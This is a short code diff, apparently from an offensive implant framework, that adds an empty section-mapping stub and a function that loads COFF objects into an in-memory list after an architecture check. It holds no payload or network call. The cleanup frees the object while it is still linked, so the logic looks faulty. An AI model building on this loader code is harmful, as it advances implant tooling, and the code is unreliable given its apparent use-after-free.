@@ -314,6 +314,10 @@ namespace Memory {
         VOID GetSectionSize() {
 
         }
+
+        VOID MapSections() {
+
+        }
     }
 
     namespace Modules {
@@ -508,6 +512,24 @@ namespace Memory {
                 if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE))) {
                     return_defer(ntstatus);
                 }
+            }
+        }
+
+        VOID LoadObject(_parser &parser) {
+            HEXANE
+
+            _executable *object = Memory::Methods::CreateImageData(B_PTR(parser.Buffer));
+
+            object->next    = Ctx->Coffs;
+            Ctx->Coffs      = object;
+
+            if (!Opsec::SeImageCheckArch(object)) {
+                return_defer(ntstatus);
+            }
+
+            defer:
+            if (object) {
+                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, object);
             }
         }
     }
